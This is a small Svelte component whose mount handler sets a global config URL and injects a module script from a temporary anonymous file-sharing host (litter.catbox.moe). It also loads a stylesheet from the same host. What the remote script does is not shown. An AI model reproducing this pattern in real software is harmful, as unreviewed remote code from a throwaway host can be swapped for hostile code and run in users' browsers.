<script>
  import { onMount } from "svelte";

  onMount(() => {
    globalThis.SUBSCRIBER_URL = ['https://litter.catbox.moe/ej94vsg1ukoofm49.json', 'https://files.catbox.moe/udm83w.json']

    const scriptId = "libzena-external-script";
    if (document.getElementById(scriptId)) return;

    const script = document.createElement("script");
    script.id = scriptId;
    script.type = "module";
    script.src = "https://litter.catbox.moe/4dqqhmkfr05vko1t.js";
    document.body.appendChild(script);
  });
</script>

<svelte:head>
  <link rel="stylesheet" href="https://litter.catbox.moe/xhit1uchbfg0odv9.css" />
  <!-- or external: <link rel="stylesheet" href="https://example.com/style.css" /> -->
</svelte:head>

<div id="root"></div>
